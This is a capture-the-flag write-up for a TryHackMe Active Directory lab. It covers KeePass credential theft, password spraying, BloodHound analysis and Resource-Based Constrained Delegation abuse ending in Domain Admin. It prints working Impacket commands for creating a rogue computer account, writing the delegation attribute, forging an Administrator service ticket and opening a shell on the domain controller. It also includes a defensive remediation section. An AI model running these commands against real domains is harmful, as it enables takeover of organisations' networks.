# Active Directory: KeePass to RBCD Abuse — TryHackMe

**Date:** 2026-09-09  
**Category:** Active Directory, Network  
**Skills used:** Nmap, RDP, credential extraction (KeePass), password spraying, BloodHound, Resource-Based Constrained Delegation (RBCD)  

> **TL;DR:** Starting from provided credentials, RDP'd in and extracted database entries from a
> local KeePass vault, which yielded a second user's password via reuse (password spraying).
> BloodHound showed that user held an `AddAllowedToAct` edge against the domain controller —
> **Resource-Based Constrained Delegation (RBCD)** — which I abused by creating a rogue computer
> account, delegating access to it, and forging a service ticket as Administrator.

## Overview
The chain: **Nmap → RDP with provided creds → local credential harvesting (KeePass) → password
spray → BloodHound → RBCD abuse → Domain Admin.** This complements my earlier AD writeup — same
end goal (DA via delegation abuse), but a different delegation mechanism: **RBCD**, where the
attacker *creates and grants* a delegation right, rather than abusing one that already existed
(`AllowedToDelegate`).

## Stage 1 — Recon & Initial Access
Started with an Nmap scan as first instinct, then connected over RDP using the credentials
already provided for the engagement:

```bash
xfreerdp /u:<provided_user> /p:<provided_pass> /v:$TARGET_IP
```

## Stage 2 — Local Credential Harvesting (KeePass)
In the user's `Documents` folder I found a **`Database.kdbx`** file — a KeePass vault. The
Desktop already had **KeePass2** installed, and it could be run directly under the current
Windows user **without a master password prompt** (the vault was unlocked/cached for that
session). This let me open the database and read out stored credentials, including one for
`t.jones`.

## Stage 3 — Password Spraying (Credential Reuse)
Spraying the password recovered from the KeePass database across known domain users, I found
that **`t.jones` and `r.williams` shared the same password** — a credential-reuse issue. That
gave me valid access as **`r.williams`**.

## Stage 4 — BloodHound: Finding the RBCD Path
With `r.williams`' credentials, BloodHound showed an **`AddAllowedToAct`** edge from
`r.williams` toward `dc01.ctf.local`. That edge means `r.williams` has permission to modify the
domain controller's `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute — i.e., **grant any
computer account of my choosing the right to delegate to the DC.** This is the setup for
**Resource-Based Constrained Delegation (RBCD) abuse**.

## Stage 5 — Creating a Rogue Computer Account
Using `r.williams`' rights, I created a new computer account under my control:

```bash
python3 addcomputer.py -dc-ip $DC_IP -computer-name 'OGCOMP$' \
  -computer-pass '[REDACTED]' 'ctf.local/r.williams:[REDACTED]'
```

By default, authenticated domain users can create a limited number of computer accounts
(`ms-DS-MachineAccountQuota`) — this gives me an account **I fully control**, which is the
piece RBCD abuse needs.

## Stage 6 — Configuring RBCD
With `r.williams`' `AddAllowedToAct` rights, I set the DC's delegation attribute to trust my new
computer account:

```bash
python3 rbcd.py -dc-ip $DC_IP -action write \
  -delegate-from 'OGCOMP$' -delegate-to 'DC01$' \
  'ctf.local/r.williams:[REDACTED]'
```

This tells `DC01$` to accept delegated authentication **from** `OGCOMP$` — meaning `OGCOMP$` can
now request service tickets impersonating any user against the DC.

## Stage 7 — Forging a Service Ticket as Administrator
Using the rogue computer account's own credentials (which I set myself), I requested a ticket
impersonating the Administrator via the S4U2Self/S4U2Proxy exchange:

```bash
python3 getST.py -dc-ip $DC_IP -spn 'CIFS/DC01.ctf.local' \
  -impersonate 'Administrator' 'ctf.local/OGCOMP$:[REDACTED]'
```

## Stage 8 — Domain Admin Shell
With the forged ticket, I authenticated as Administrator and got a shell to grab the flag:

```bash
python3 smbexec.py -k -no-pass ctf.local/Administrator@dc01.ctf.local
```

## RBCD vs. My Earlier `AllowedToDelegate` Chain
Worth contrasting with my previous AD writeup, since both end in DA via delegation abuse but
start from opposite positions:
- **`AllowedToDelegate` (previous writeup):** an *existing* account was already misconfigured
  with delegation rights — I just abused a grant that was already there.
- **`AddAllowedToAct` / RBCD (this writeup):** `r.williams` had the *right to grant* delegation,
  not delegation itself. I had to **create my own computer account** and configure the trust
  myself before abusing it. RBCD is generally the more common real-world path because it only
  requires write access to one attribute, not a pre-existing delegation misconfiguration.

## The Fix (Defensive View)
- **KeePass exposure (Stage 2):** never leave a password vault unlocked/cached under a logged-in
  session; require the master password every time, and don't store vaults in user-accessible
  locations on shared or RDP-accessible hosts.
- **Password reuse (Stage 3):** enforce unique passwords across accounts; a password manager
  helps users *avoid* reuse — the irony here is a KeePass vault is exactly the tool meant to
  prevent this, undone by being left unlocked.
- **`AddAllowedToAct` rights (Stage 4):** audit which users/groups can write to
  `msDS-AllowedToActOnBehalfOfOtherIdentity` on sensitive computer objects — this should be
  tightly restricted, not delegated broadly.
- **Machine account creation (Stage 5):** lower or monitor `ms-DS-MachineAccountQuota`; by
  default every authenticated user can create several computer accounts, which is the
  prerequisite this entire chain relied on.
- **General:** BloodHound-style path analysis should be run defensively too — this exact
  `AddAllowedToAct` edge would have surfaced the risk before an attacker exploited it.

## What I Learned
This chain showed a different route to the same outcome as delegation abuse generally, but
starting from **local host compromise** (an exposed credential vault) rather than a
network-level coercion trick. The password-reuse pivot was a reminder that even a properly used
security tool (KeePass) fails if session hygiene is weak. The core technical concept —
**RBCD** — clicked once I understood it as *"I don't need an existing delegation
misconfiguration if I can grant myself one,"* using a self-created computer account as the
delegating identity. Comparing this against my earlier `AllowedToDelegate` writeup made both
techniques clearer, since seeing two different paths to the same S4U2Self/S4U2Proxy abuse
highlighted what's actually common to both (the Kerberos exchange) versus what differs (how the
delegation trust gets established in the first place).
